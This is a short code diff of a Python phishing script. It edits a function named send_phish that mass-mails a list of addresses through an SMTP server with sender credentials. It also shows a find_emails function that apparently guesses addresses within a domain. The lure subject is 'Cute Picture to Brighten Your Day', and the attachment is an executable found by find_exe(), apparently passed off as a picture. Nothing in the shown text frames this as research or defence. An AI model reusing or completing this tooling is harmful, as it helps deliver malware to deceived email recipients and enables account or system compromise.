@@ -1,3 +1,4 @@
+#Currently untested
 import itertools
 import string
 
@@ -14,9 +15,11 @@ def find_emails(email_domain, max_length):
 
 
 def send_phish(p_subject, p_body, p_to_email, p_smtp_server, p_smtp_port, p_sender_email, p_sender_password, p_ap):
-    for address in p_to_email:
-        send_email(p_subject, p_body, address, p_smtp_server, p_smtp_port, p_sender_email, p_sender_password, p_ap)
-
+    try:
+        for address in p_to_email:
+            send_email(p_subject, p_body, address, p_smtp_server, p_smtp_port, p_sender_email, p_sender_password, p_ap)
+    except:
+        print("Email does not exist")
 
 subject = "Cute Picture to Brighten Your Day"
 attachment_path = find_exe()
